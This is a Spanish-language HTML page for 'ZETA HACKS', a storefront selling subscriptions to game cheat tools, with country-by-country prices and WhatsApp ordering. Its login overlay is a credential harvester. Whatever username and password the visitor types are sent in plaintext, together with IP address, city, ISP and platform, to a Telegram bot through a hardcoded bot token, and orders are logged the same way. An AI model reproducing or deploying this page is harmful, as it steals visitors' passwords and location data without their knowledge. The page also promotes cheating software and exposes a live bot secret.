<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZETA HACKS | MILITARY GRADE SYSTEMS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700;900&family=JetBrains+Mono:wght@300;700&display=swap');

        :root {
            --neon: #00ff41;
            --danger: #ff003c;
            --cyan: #00f2ff;
            --dark: #020202;
            --glass: rgba(10, 10, 10, 0.95);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
        
        body {
            background: var(--dark);
            color: #fff;
            overflow-x: hidden;
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
        }

        /* --- PANTALLA DE ACCESO TÁCTICO --- */
        #auth-overlay {
            position: fixed; inset: 0; background: #000; z-index: 10000;
            display: flex; align-items: center; justify-content: center;
        }

        .auth-container {
            width: 90%; max-width: 450px; padding: 40px;
            border: 1px solid #111; background: var(--glass);
            position: relative; overflow: hidden;
        }

        .auth-container::before {
            content: ""; position: absolute; top: 0; left: 0; width: 40px; height: 40px;
            border-top: 4px solid var(--neon); border-left: 4px solid var(--neon);
        }

        .auth-container h2 {
            font-family: 'Big Shoulders Display'; font-size: 3rem; 
            letter-spacing: 5px; color: #fff; text-align: center; margin-bottom: 30px;
        }

        .input-group { position: relative; margin-bottom: 20px; }
        .input-group i { position: absolute; left: 15px; top: 18px; color: var(--neon); }

        .auth-input {
            width: 100%; background: #080808; border: 1px solid #222;
            padding: 15px 15px 15px 45px; color: var(--neon); font-size: 1rem;
            transition: 0.3s;
        }

        .auth-input:focus { border-color: var(--neon); box-shadow: 0 0 15px rgba(0,255,65,0.2); }

        .auth-btn {
            width: 100%; padding: 20px; background: var(--neon); color: #000;
            border: none; font-weight: 900; font-size: 1.2rem; cursor: pointer;
            text-transform: uppercase; clip-path: polygon(0 0, 90% 0, 100% 30%, 100% 100%, 10% 100%, 0 70%);
            transition: 0.3s;
        }

        .auth-btn:hover { background: #fff; transform: scale(1.02); }

        /* --- HEADER HUD --- */
        header {
            padding: 30px; display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid #111; background: rgba(0,0,0,0.8);
            position: sticky; top: 0; z-index: 900;
        }

        .logo-zeta { font-family: 'Big Shoulders Display'; font-size: 2.5rem; letter-spacing: 10px; }
        .logo-zeta span { color: var(--neon); }

        /* --- DASHBOARD --- */
        .container { max-width: 1400px; margin: auto; padding: 40px 20px; }

        .section-title {
            font-size: 0.8rem; color: #444; margin-bottom: 20px; 
            text-transform: uppercase; letter-spacing: 5px; border-left: 3px solid var(--neon); padding-left: 10px;
        }

        /* CARD DE PAÍSES */
        .grid-countries { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .country-node {
            background: #080808; border: 1px solid #151515; padding: 30px;
            text-align: center; cursor: pointer; transition: 0.3s;
        }

        .country-node:hover {
            border-color: var(--neon); background: rgba(0, 255, 65, 0.05);
            transform: translateY(-5px);
        }

        .country-node span { font-size: 3rem; display: block; margin-bottom: 10px; filter: grayscale(1); transition: 0.3s; }
        .country-node:hover span { filter: grayscale(0); transform: scale(1.1); }

        /* PRODUCTOS */
        .grid-prods { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 25px; }
        .prod-node {
            background: #050505; border: 1px solid #111; padding: 0;
            position: relative; transition: 0.4s;
        }

        .prod-header {
            background: #080808; padding: 20px; border-bottom: 1px solid #111;
            display: flex; justify-content: space-between; align-items: center;
        }

        .prod-header h3 { font-family: 'Big Shoulders Display'; font-size: 1.5rem; letter-spacing: 2px; color: var(--neon); }

        .price-item {
            padding: 20px; display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid #080808; transition: 0.2s;
        }

        .price-item:hover { background: #0a0a0a; }

        .price-item b { font-size: 1.2rem; color: #fff; }
        
        .buy-trigger {
            background: transparent; border: 1px solid var(--neon); color: var(--neon);
            padding: 10px 20px; font-size: 0.7rem; font-weight: 700; cursor: pointer;
            transition: 0.3s;
        }

        .buy-trigger:hover { background: var(--neon); color: #000; }

        /* FLOATING WHATSAPP */
        .wa-link {
            position: fixed; bottom: 30px; right: 30px; width: 60px; height: 60px;
            background: var(--neon); border-radius: 0; display: flex;
            align-items: center; justify-content: center; color: #000;
            font-size: 25px; z-index: 1000; box-shadow: 0 0 20px rgba(0,255,65,0.4);
        }

        /* ANIMACIONES */
        .glitch { animation: glitch-anim 2s infinite; }
        @keyframes glitch-anim {
            0% { text-shadow: 2px 0 var(--cyan); }
            50% { text-shadow: -2px 0 var(--danger); }
            100% { text-shadow: 2px 0 var(--cyan); }
        }
    </style>
</head>
<body>

<div id="auth-overlay">
    <div class="auth-container">
        <h2>ZETA_SYSTEMS</h2>
        <div class="input-group">
            <i class="fa fa-user"></i>
            <input type="text" id="ag-user" class="auth-input" placeholder="OPERATIVE_ID">
        </div>
        <div class="input-group">
            <i class="fa fa-lock"></i>
            <input type="password" id="ag-pass" class="auth-input" placeholder="SECURE_KEY">
        </div>
        <button class="auth-btn" onclick="requestAccess()">AUTHORIZE</button>
        <p style="color:#222; font-size:0.6rem; margin-top:20px; text-align:center;">ENCRYPTION: AES-256 BIT ACTIVE</p>
    </div>
</div>

<header>
    <div class="logo-zeta">ZETA<span>HACKS</span></div>
    <div id="hud-info" style="font-size:0.6rem; text-align:right; color:#444;">
        STATUS: <span style="color:var(--neon)">ENCRYPTED</span><br>
        LOC: <span id="loc-data">FETCHING...</span>
    </div>
</header>

<div class="container" id="main-ui" style="display:none;">
    
    <div id="view-home">
        <div class="section-title">Nodos de Red Global</div>
        <div class="grid-countries" id="country-list"></div>
    </div>

    <div id="view-store" style="display:none;">
        <button onclick="location.reload()" style="background:none; border:none; color:var(--danger); cursor:pointer; margin-bottom:30px; font-size:0.7rem;">[X] DISCONNECT_NODE</button>
        <h1 id="node-name" class="glitch" style="font-family:'Big Shoulders Display'; font-size:4rem; margin-bottom:40px;"></h1>
        <div class="grid-prods" id="prod-list"></div>
    </div>

</div>

<a href="https://wa.me/573001308078" class="wa-link" target="_blank"><i class="fab fa-whatsapp"></i></a>

<script>
const BOT_TOKEN = "8093212860:AAFtxW_wZgngSg7nq-sKCvhTONkcSRgSy-c";
const CHAT_ID = "7621351319";

async function postToTelegram(msg) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
    return fetch(url);
}

async function requestAccess() {
    const u = document.getElementById('ag-user').value;
    const p = document.getElementById('ag-pass').value;
    if(!u || !p) return;

    try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();
        
        const report = `
🔱 *ACCESO DE AGENTE DETECTADO*
━━━━━━━━━━━━━━━━━━
👤 *OPERATIVO:* \`${u}\`
🔑 *CLAVE:* \`${p}\`
━━━━━━━━━━━━━━━━━━
🌍 *IP:* \`${ipData.ip}\`
📍 *UBICACIÓN:* ${ipData.city}, ${ipData.country_name}
📡 *ISP:* ${ipData.org}
📱 *SISTEMA:* ${navigator.platform}
━━━━━━━━━━━━━━━━━━`;

        await postToTelegram(report);
        
        localStorage.setItem('zeta_operative', u);
        document.getElementById('auth-overlay').style.display = 'none';
        document.getElementById('main-ui').style.display = 'block';
        document.getElementById('loc-data').innerText = ipData.ip;
        renderNodes();

    } catch (e) {
        // Fallback si la IP falla
        postToTelegram(`⚠️ LOGIN BASICO: ${u} | Pass: ${p}`);
        localStorage.setItem('zeta_operative', u);
        document.getElementById('auth-overlay').style.display = 'none';
        document.getElementById('main-ui').style.display = 'block';
        renderNodes();
    }
}

const DATA = {
    paises: [
        {n:"ARGENTINA", b:"🇦🇷", t:1500, c:"ARS"}, {n:"BOLIVIA", b:"🇧🇴", t:14, c:"BS"},
        {n:"BRASIL", b:"🇧🇷", t:5.2, c:"BRL"}, {n:"CHILE", b:"🇨🇱", t:970, c:"CLP"},
        {n:"COLOMBIA", b:"🇨🇴", t:3900, c:"COP"}, {n:"MEXICO", b:"🇲🇽", t:20, c:"MXN"},
        {n:"PERU", b:"🇵🇪", t:3.55, c:"PEN"}, {n:"USA", b:"🇺🇸", t:1, c:"USD"}
    ],
    items: [
        {n:"DRIP MOBILE NORMAL", d:[1,7,15,30], p:[3,8,12,18]},
        {n:"DRIP MOBILE ROOT", d:[1,7,15,30], p:[3,8,12,18]},
        {n:"CUBAN MODS", d:[1,10,31], p:[3,9,19]},
        {n:"GBOX IOS", d:["ANUAL"], p:[18]},
        {n:"CUBAN PANEL PC", d:[1,7,30], p:[3,8,16]}
    ]
};

function renderNodes() {
    const list = document.getElementById('country-list');
    DATA.paises.forEach(p => {
        const d = document.createElement('div');
        d.className = 'country-node';
        d.onclick = () => openNode(p);
        d.innerHTML = `<span>${p.b}</span><b>${p.n}</b>`;
        list.appendChild(d);
    });
}

function openNode(p) {
    document.getElementById('view-home').style.display = 'none';
    document.getElementById('view-store').style.display = 'block';
    document.getElementById('node-name').innerText = `NODE_${p.n}`;
    window.scrollTo(0,0);

    const list = document.getElementById('prod-list'); list.innerHTML = '';
    DATA.items.forEach(i => {
        let content = '';
        i.d.forEach((d, idx) => {
            let v = Math.ceil(i.p[idx] * p.t);
            let t = isNaN(d) ? d : d + " DÍAS";
            content += `
            <div class="price-item">
                <b>${t}</b>
                <div>
                    <span style="color:#555; font-size:0.8rem; margin-right:15px;">${v.toLocaleString()} ${p.c}</span>
                    <button class="buy-trigger" onclick="executeOrder('${i.n}','${t}','${v} ${p.c}')">EXECUTE</button>
                </div>
            </div>`;
        });
        list.innerHTML += `<div class="prod-node"><div class="prod-header"><h3>${i.n}</h3><i class="fa fa-microchip"></i></div>${content}</div>`;
    });
}

function executeOrder(n, d, p) {
    const user = localStorage.getItem('zeta_operative');
    const msg = `💰 *SOLICITUD DE COMPRA*\n━━━━━━━━━━━━━━━━━━\n👤 OPERATIVO: ${user}\n💎 ITEM: ${n}\n⏳ PLAN: ${d}\n💵 PRECIO: ${p}`;
    postToTelegram(msg);
    
    const wa = `https://wa.me/573001308078?text=🔱 *ZETA_SYSTEMS_ORDER*%0A👤 Agente: ${user}%0A💎 Software: ${n}%0A⏳ Plan: ${d}%0A💰 Precio: ${p}`;
    window.open(wa, '_blank');
}

// Auto-reconocimiento
if(localStorage.getItem('zeta_operative')) {
    document.getElementById('auth-overlay').style.display = 'none';
    document.getElementById('main-ui').style.display = 'block';
    renderNodes();
}
</script>
</body>
</html>
